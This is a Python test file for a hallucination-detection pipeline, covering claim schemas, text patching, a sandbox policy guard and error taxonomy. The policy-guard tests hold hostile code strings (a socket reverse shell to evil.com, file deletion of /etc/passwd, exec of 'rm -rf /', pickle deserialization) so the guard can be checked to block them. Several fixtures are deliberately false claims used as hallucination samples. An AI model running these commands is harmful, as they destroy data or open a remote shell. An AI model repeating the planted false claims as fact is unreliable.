"""
WS5-02: Regression Test Pack.

Golden test cases for hallucination detection pipeline:
- Contradiction detection
- Unresolved ambiguity handling
- Restoration safety (surgical replace)
- Policy guard integration
- Error taxonomy correctness

These tests run without LLM API calls — all logic is tested locally.
"""

import pytest

from rhecs_core.extraction.extractor import (
    AtomicClaim,
    ClaimList,
    ClaimMetadata,
    ClaimStatus,
)
from rhecs_core.restoration.replacer import (
    PatchMethod,
    surgical_replace,
    surgical_replace_safe,
)
from rhecs_core.verification.policy_guard import check_policy
from rhecs_core.verification.sandbox_errors import (
    RETRY_POLICY,
    SandboxError,
    SandboxErrorType,
    SandboxResult,
    SandboxTelemetry,
    classify_stderr,
)

# ── Regression: Contradiction Detection ────────────────────────────────


class TestContradictionGolden:
    """
    Golden test cases: LLM outputs that MUST be classified as contradictions.
    These test the claim pipeline schema, not actual LLM calls.
    """

    def test_entity_mismatch(self):
        """Gold: 'Albert Einstein built the Eiffel Tower' → entity error."""
        claim = AtomicClaim(
            entity="Albert Einstein",
            relationship="built",
            target="Eiffel Tower",
            metadata=ClaimMetadata(time="1889", location="Paris"),
            status=ClaimStatus.RESOLVED,
        )
        assert claim.is_resolved
        assert claim.entity == "Albert Einstein"

    def test_date_mismatch(self):
        """Gold: Wrong date should be extractable with metadata."""
        claim = AtomicClaim(
            entity="OpenAI",
            relationship="released",
            target="ChatGPT",
            metadata=ClaimMetadata(time="2020"),  # Correct: 2022
            status=ClaimStatus.RESOLVED,
        )
        assert claim.metadata.time == "2020"

    def test_nonexistent_event(self):
        """Gold: Fabricated event that has no evidence."""
        claim = AtomicClaim(
            entity="NASA",
            relationship="announced",
            target="first contact with aliens",
            metadata=ClaimMetadata(time="2025"),
            status=ClaimStatus.RESOLVED,
        )
        assert claim.entity == "NASA"


# ── Regression: Unresolved Ambiguity ───────────────────────────────────


class TestUnresolvedGolden:
    """Golden test cases for pronoun ambiguity handling (WS3-01)."""

    def test_ambiguous_pronoun_preserved(self):
        """Claim with unresolved 'he/she' should be tagged, not dropped."""
        claim = AtomicClaim(
            entity="Họ",  # "They" in Vietnamese — ambiguous
            relationship="đã xây dựng",
            target="tòa nhà",
            metadata=ClaimMetadata(),
            status=ClaimStatus.UNRESOLVED_AMBIGUITY,
        )
        assert claim.is_unresolved

    def test_mixed_resolution_list(self):
        """ClaimList with mixed statuses filters correctly."""
        claims = ClaimList(
            claims=[
                AtomicClaim(
                    entity="E1",
                    relationship="R",
                    target="T",
                    metadata=ClaimMetadata(),
                    status=ClaimStatus.RESOLVED,
                ),
                AtomicClaim(
                    entity="E2",
                    relationship="R",
                    target="T",
                    metadata=ClaimMetadata(),
                    status=ClaimStatus.UNRESOLVED_AMBIGUITY,
                ),
                AtomicClaim(
                    entity="E3",
                    relationship="R",
                    target="T",
                    metadata=ClaimMetadata(),
                    status=ClaimStatus.RESOLVED,
                ),
            ]
        )
        assert len(claims.resolved_claims) == 2
        assert len(claims.unresolved_claims) == 1
        assert claims.unresolved_count == 1

    def test_all_unresolved(self):
        claims = ClaimList(
            claims=[
                AtomicClaim(
                    entity="Nó",
                    relationship="R",
                    target="T",
                    metadata=ClaimMetadata(),
                    status=ClaimStatus.UNRESOLVED_AMBIGUITY,
                ),
            ]
        )
        assert len(claims.resolved_claims) == 0
        assert len(claims.unresolved_claims) == 1


# ── Regression: Restoration Safety ─────────────────────────────────────


class TestRestorationGolden:
    """Golden test cases ensuring surgical replacement is safe."""

    def test_exact_patch_vietnamese(self):
        """Vietnamese text with diacritics must patch correctly."""
        draft = "Gustave Eiffel đã thiết kế Tượng Nữ thần Tự do vào năm 1900"
        patched = surgical_replace(draft, "năm 1900", "năm 1886")
        assert "năm 1886" in patched
        assert "năm 1900" not in patched

    def test_no_collateral_damage(self):
        """Patch must not alter text outside the fault span."""
        draft = "A B C D E F"
        patched = surgical_replace(draft, "C D", "X Y")
        assert patched == "A B X Y E F"

    def test_first_occurrence_only(self):
        """Only the first occurrence is patched (safety)."""
        draft = "claim claim claim"
        patched = surgical_replace(draft, "claim", "fixed")
        assert patched == "fixed claim claim"

    def test_safe_api_failure(self):
        """surgical_replace_safe should NOT crash on mismatch."""
        result = surgical_replace_safe(
            "hello world",
            "totally different and long enough text string here",
            "replacement",
        )
        assert not result.success
        assert result.method == PatchMethod.FAILED
        assert result.error is not None

    def test_empty_fault_span_safe(self):
        """Empty fault span → safe failure."""
        result = surgical_replace_safe("hello", "", "world")
        assert not result.success


# ── Regression: Policy Guard ───────────────────────────────────────────


class TestPolicyGuardGolden:
    """Golden test cases for sandbox policy enforcement."""

    def test_safe_evidence_script(self):
        """Canonical safe script pattern must always pass."""
        code = (
            "from rhecs_core.verification.sandbox_helpers import search_evidence\n"
            "import json\n"
            "results = search_evidence('test query')\n"
            "print(json.dumps({'evidence': results}))\n"
        )
        result = check_policy(code)
        assert result.allowed, f"Safe script blocked: {result.summary()}"

    def test_rm_rf_blocked(self):
        """os.remove and variants must be blocked."""
        code = "import os\nos.remove('/etc/passwd')"
        result = check_policy(code)
        assert not result.allowed

    def test_reverse_shell_blocked(self):
        """Network-related imports must be blocked."""
        code = "import socket\ns=socket.socket()\ns.connect(('evil.com',4444))"
        result = check_policy(code)
        assert not result.allowed

    def test_exec_payload_blocked(self):
        """exec() injection must be blocked."""
        code = "exec('import os; os.system(\"rm -rf /\")')"
        result = check_policy(code)
        assert not result.allowed

    def test_pickle_deserialization_blocked(self):
        """pickle.loads is a known RCE vector."""
        code = "import pickle\npickle.loads(b'data')"
        result = check_policy(code)
        assert not result.allowed


# ── Regression: Error Taxonomy ─────────────────────────────────────────


class TestErrorTaxonomyGolden:
    """Golden test cases for error classification correctness."""

    def test_policy_violation_never_retried(self):
        assert RETRY_POLICY[SandboxErrorType.POLICY_VIOLATION] is False

    def test_timeout_never_retried(self):
        assert RETRY_POLICY[SandboxErrorType.TIMEOUT] is False

    def test_syntax_error_retried(self):
        assert RETRY_POLICY[SandboxErrorType.SYNTAX_ERROR] is True

    def test_classify_real_traceback(self):
        stderr = """Traceback (most recent call last):
  File "/tmp/sandbox.py", line 12, in <module>
    result = compute()
  File "/tmp/sandbox.py", line 8, in compute
    return 1 / 0
ZeroDivisionError: division by zero"""
        error_type, line = classify_stderr(stderr)
        assert error_type == SandboxErrorType.RUNTIME_ERROR
        assert line is not None

    def test_telemetry_counters(self):
        """Telemetry must track all error types correctly."""
        tel = SandboxTelemetry()
        tel.record(SandboxResult(success=True, output={}))
        tel.record(
            SandboxResult(
                success=False,
                error=SandboxError(
                    error_type=SandboxErrorType.POLICY_VIOLATION,
                    message="x",
                    retryable=False,
                ),
            )
        )
        tel.record(
            SandboxResult(
                success=False,
                error=SandboxError(
                    error_type=SandboxErrorType.TIMEOUT, message="x", retryable=False
                ),
            )
        )

        assert tel.total_executions == 3
        assert tel.successes == 1
        assert tel.policy_blocks == 1
        assert tel.timeouts == 1
        d = tel.to_dict()
        assert abs(d["success_rate"] - 1 / 3) < 0.01


# ── Regression: Schema Serialization Round-trip ────────────────────────


class TestSchemaRoundtrip:
    """Ensure claim schemas survive JSON serialization."""

    def test_claim_roundtrip(self):
        claim = AtomicClaim(
            entity="RHECS",
            relationship="detects",
            target="hallucinations",
            metadata=ClaimMetadata(time="2026", location="Vietnam"),
            status=ClaimStatus.RESOLVED,
        )
        json_str = claim.model_dump_json()
        restored = AtomicClaim.model_validate_json(json_str)
        assert restored.entity == claim.entity
        assert restored.status == claim.status
        assert restored.metadata.time == "2026"

    def test_claim_list_roundtrip(self):
        cl = ClaimList(
            claims=[
                AtomicClaim(
                    entity="A",
                    relationship="B",
                    target="C",
                    metadata=ClaimMetadata(),
                    status=ClaimStatus.RESOLVED,
                ),
                AtomicClaim(
                    entity="D",
                    relationship="E",
                    target="F",
                    metadata=ClaimMetadata(),
                    status=ClaimStatus.UNRESOLVED_AMBIGUITY,
                ),
            ]
        )
        json_str = cl.model_dump_json()
        restored = ClaimList.model_validate_json(json_str)
        assert len(restored.claims) == 2
        assert restored.claims[0].is_resolved
        assert restored.claims[1].is_unresolved
